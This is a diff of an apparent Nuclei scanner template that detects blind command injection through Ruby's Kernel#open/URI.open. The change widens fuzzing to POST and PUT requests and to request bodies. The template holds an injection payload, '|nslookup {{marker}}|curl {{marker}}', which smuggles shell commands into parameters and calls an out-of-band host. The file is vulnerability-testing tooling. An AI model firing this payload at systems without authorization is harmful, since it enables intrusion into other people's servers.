@@ -1,5 +1,4 @@
 id: cmdi-ruby-open-rce
-
 info:
   name: Ruby Kernel#open/URI.open RCE
   author: pdteam
@@ -11,30 +10,29 @@ info:
     - https://codeql.github.com/codeql-query-help/ruby/rb-kernel-open/
   metadata:
     max-request: 1
-  tags: cmdi,oast,dast,blind,ruby,rce,vuln
-
+  tags: blind,cmdi,dast,oast,rce,ruby,vuln
 variables:
-  marker: "{{interactsh-url}}"
-
+  marker: '{{interactsh-url}}'
 http:
-  - pre-condition:
-      - type: dsl
-        dsl:
-          - 'method == "GET"'
-
-    stop-at-first-match: true
+  - fuzzing:
+      - fuzz:
+          - '{{interaction}}'
+        parts:
+          - query
+          - body
+    matchers:
+      - part: interactsh_protocol
+        type: word
+        words:
+          - dns
+          # digest: 4b0a00483046022100e0426452b9d9cfa0ff0ba648b26c60b3fbcc93a25174f502334d9693ddb5b41b0221008c11d287b5f6fc884922738abbf813b43201b6aede175b32f502fd4d2bd73419:922c64590222798bb761d5b6d8e72950
     payloads:
       interaction:
-        - "|nslookup {{marker}}|curl {{marker}}"
-
-    fuzzing:
-      - part: query
-        fuzz:
-          - "{{interaction}}"
-
-    matchers:
-      - type: word
-        part: interactsh_protocol
-        words:
-          - "dns"
-
+        - '|nslookup {{marker}}|curl {{marker}}'
+    pre-condition:
+      - dsl:
+          - method == "GET"
+          - method == "POST"
+          - method == "PUT"
+        type: dsl
+    stop-at-first-match: true
